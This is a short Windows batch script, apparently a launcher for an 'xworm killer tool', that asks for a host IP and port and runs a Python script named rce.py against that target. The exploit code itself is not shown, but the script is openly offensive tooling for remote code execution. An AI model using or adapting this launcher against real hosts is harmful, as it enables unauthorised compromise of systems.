@echo off
cls
echo xworm killer tool by idiots team =)))
set /p ip=[?] Enter Host (ip): 
set /p port=[?] Enter Port: 
python rce.py --host %ip% --port %port%